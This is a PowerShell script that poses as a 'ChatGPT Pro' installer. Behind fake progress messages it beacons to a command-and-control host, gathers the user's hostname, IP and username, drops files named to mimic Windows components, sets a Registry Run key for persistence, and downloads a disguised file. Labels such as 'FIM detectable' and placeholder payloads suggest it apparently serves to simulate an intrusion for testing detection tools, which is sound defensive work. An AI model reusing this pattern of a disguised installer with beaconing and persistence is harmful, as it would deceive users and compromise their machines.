Write-Host "[*] ChatGPT Pro v2.4.1 Installer" -ForegroundColor Green
Start-Sleep -Seconds 2

# === C2 Beacon ===
Write-Host "[*] Checking for updates..." -ForegroundColor Yellow
try { 
  $null = Invoke-WebRequest -Uri "http://evil-c2-malware.ddns.net/beacon" -TimeoutSec 3 -ErrorAction SilentlyContinue
} catch {}

# === Reconnaissance ===
Write-Host "[*] Optimizing for your system..." -ForegroundColor Yellow
$hostname = hostname
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch "Loopback"}).IPAddress
$recon = @{host=$hostname; ip=$ip; user=$env:USERNAME; ts=Get-Date} | ConvertTo-Json
$recon | Out-File "$env:TEMP\sysinfo.json"

# === Payload drops (FIM detectable) ===
$malwareDir = "$env:TEMP\WindowsUpdate"
mkdir $malwareDir -Force | Out-Null
"$hostname C2 BEACON ACTIVE" | Out-File "$malwareDir\beacon.dll" -Encoding ASCII
"dropper-payload-v3" | Out-File "$malwareDir\payload.exe" -Encoding ASCII
"MZ" + ([char[]](Get-Random -Count 100)) | Out-File "$env:TEMP\svchost.exe" -Encoding ASCII

# === Persistence via Registry Run key ===
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "WindowsUpdateHelper" -Value "$malwareDir\beacon.dll" -Force

# === Download fake "update" ===
try {
  Invoke-WebRequest -Uri "http://192.168.122.1:8080/openai.png" -OutFile "$env:TEMP\update_patch.png" -ErrorAction SilentlyContinue
} catch {}

Write-Host "[+] ChatGPT Pro installed! Restart recommended." -ForegroundColor Green
Start-Process "https://chat.openai.com"
